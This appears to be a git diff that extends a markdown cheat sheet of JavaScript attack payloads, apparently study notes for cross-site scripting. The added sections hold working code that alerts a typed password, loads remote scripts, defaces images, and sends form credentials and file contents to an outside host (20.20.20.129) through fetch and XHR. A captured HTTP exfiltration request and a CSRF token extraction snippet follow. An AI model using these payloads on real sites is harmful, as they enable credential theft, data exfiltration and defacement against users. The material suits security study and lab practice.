@@ -334,7 +334,7 @@ document.forms[0].appendChild(replacement_div);
 ```
 
 ## JS keylogger
-```
+```html
 <html>
  <form  method="post">
   <div class="imgcontainer">
@@ -384,6 +384,167 @@ document.forms[0].appendChild(replacement_div);
   };
 </script>
 </html>
+```
+
+## JS password POC
+```html
+<html>
+ <form  method="post">
+  <div class="imgcontainer">
+    <img src="img_avatar2.png" alt="Avatar" class="avatar">
+  </div>
+
+  <div class="container">
+    <label for="uname"><b>Username</b></label>
+    <input type="text" placeholder="Enter Username" name="uname" required>
+
+    <label for="psw"><b>Password</b></label>
+    <input type="password" placeholder="Enter Password" name="psw" required>
+
+    <button type="submit">Login</button>
+    <label>
+      <input type="checkbox" checked="checked" name="remember"> Remember me
+    </label>
+  </div>
+  <div class="container" style="background-color:#f1f1f1">
+    <button type="button" class="cancelbtn">Cancel</button>
+    <span class="psw">Forgot <a href="#">password?</a></span>
+  </div>
+</form> 
+<script>
+	document.forms[0].onsubmit = function StealPassword(){
+		alert(document.getElementsByTagName('input')[1].value);
+	};
+</script>
+</html>
+```
+
+## loading external JS I: handy when the amount of javascript exceeds the limit
+```html
+<script src="http://127.0.0.1/script.js"></script>
+```
+
+## loading external JS II: creating a script tag :D
+```javascript
+var script = document.createElement('script');
+script.src = "http://127.0.0.1/script.js";
+document.getElementsByTagName('script')[0].appendChild(script);
+```
+
+## changing the source of an image
+```javascript
+// defacement
+document.getElementsByTagName('img')[0].src = "http://127.0.0.1/replacement.jpg";
+// sending information
+document.getElementsByTagName('img')[0].src = "http://127.0.0.1/replacement.jpg?u=" + username + "&p=" + password;
+```
+
+## stealing creds from autofill using **fetch API**
+```html
+<html>
+ <form  method="post">
+  <div class="imgcontainer">
+    <img src="img_avatar2.png" alt="Avatar" class="avatar">
+  </div>
+
+  <div class="container">
+    <label for="uname"><b>Username</b></label>
+    <input type="text" placeholder="Enter Username" name="uname" required>
+
+    <label for="psw"><b>Password</b></label>
+    <input type="password" placeholder="Enter Password" name="psw" required>
+
+    <button type="submit">Login</button>
+    <label>
+      <input type="checkbox" checked="checked" name="remember"> Remember me
+    </label>
+  </div>
+  <div class="container" style="background-color:#f1f1f1">
+    <button type="button" class="cancelbtn">Cancel</button>
+    <span class="psw">Forgot <a href="#">password?</a></span>
+  </div>
+</form> 
+<script>
+  function stealThemCredz() {
+    if(this.value.length){
+      fetch('http://20.20.20.129',{method:'POST',mode: 'no-cors',body:document.getElementsByTagName('input')[0].value+':'+this.value});
+    }
+  }
+  document.getElementsByTagName('input')[1].onchange = stealThemCredz;
+</script>
+</html>
+```
+
+## execute code from text using `eval()`
+```javascript
+eval('alert("XSS!");')
+```
+
+## stealing email using JS and AJAX
+```html
+<html>
+ <form  method="post">
+  <div class="imgcontainer">
+    <img src="img_avatar2.png" alt="Avatar" class="avatar">
+  </div>
+
+  <div class="container">
+    <label for="uname"><b>Username</b></label>
+    <input type="text" placeholder="Enter Username" name="uname" required>
+
+    <label for="psw"><b>Password</b></label>
+    <input type="password" placeholder="Enter Password" name="psw" required>
+
+    <button type="submit">Login</button>
+    <label>
+      <input type="checkbox" checked="checked" name="remember"> Remember me
+    </label>
+  </div>
+  <div class="container" style="background-color:#f1f1f1">
+    <button type="button" class="cancelbtn">Cancel</button>
+    <span class="psw">Forgot <a href="#">password?</a></span>
+  </div>
+</form> 
+<script>
+  var xhr1 = new XMLHttpRequest();
+
+  xhr1.onreadystatechange = function () {
+    if (xhr1.readyState == 4 && xhr1.status == 200) {
+      var result = xhr1.responseText;
+
+      var xhr2 = new XMLHttpRequest();
+      xhr2.open("POST", "http://20.20.20.129/GotTheMail")
+      xhr2.send("mail=" + result);
+    }
+  }
+
+  xhr1.open("GET", "hello.txt");
+  xhr1.send();
+</script>
+</html>
+```
+### outcome on kali
+```
+POST /GotTheMail HTTP/1.1
+Host: 20.20.20.129
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 24
+Origin: http://127.0.0.1
+Connection: keep-alive
+Referer: http://127.0.0.1/
+
+mail=whats@up.com
+```
+
+## JS to extract CSRF token and perform CSRF attack: just locate the CSRF token within the html and access it using JS
+### if the CSRF token is in the url, the regular expressions example can be of help
+```javascript
+url = "https://www.victimsite.com/?csrftoken=95202460752969227078829139976552";
+document.URL.match("csrftoken=(.*)")[1]; //this would return "95202460752969227078829139976552"
 ```
 
 ---
